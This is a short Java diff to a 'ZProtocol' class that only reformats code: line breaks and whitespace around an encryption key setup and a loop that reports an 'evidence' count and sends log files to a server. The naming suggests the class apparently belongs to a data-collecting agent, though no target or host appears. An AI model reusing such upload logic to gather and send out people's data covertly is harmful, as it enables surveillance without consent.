@@ -43,8 +43,8 @@ public class ZProtocol extends Protocol {
     //#endif
 
     private final EncryptionPKCS5 cryptoK = new EncryptionPKCS5();
-    private final EncryptionPKCS5 cryptoConf = new EncryptionPKCS5(Encryption.getKeys()
-            .getProtoKey());
+    private final EncryptionPKCS5 cryptoConf = new EncryptionPKCS5(Encryption
+            .getKeys().getProtoKey());
 
     byte[] Kd = new byte[16];
     byte[] Nonce = new byte[16];
@@ -754,14 +754,13 @@ public class ZProtocol extends Protocol {
             //#ifdef DEBUG
             debug.trace("    dir: " + dir + " #evidences: " + lsize); //$NON-NLS-1$ //$NON-NLS-2$
             //#endif
-            
+
             // Evidence SIZE
             byte[] plainOut = new byte[4 + 8];
-            Utils.copy(plainOut, 0, Utils.intToByteArray(lsize),
-                    0, 4);
+            Utils.copy(plainOut, 0, Utils.intToByteArray(lsize), 0, 4);
             byte[] response = command(Proto.EVIDENCE_SIZE, plainOut);
             checkOk(response);
-            
+
             for (int j = 0; j < lsize; ++j) {
                 final String logName = (String) logs.elementAt(j);
                 final String fullLogName = basePath + dir + logName;
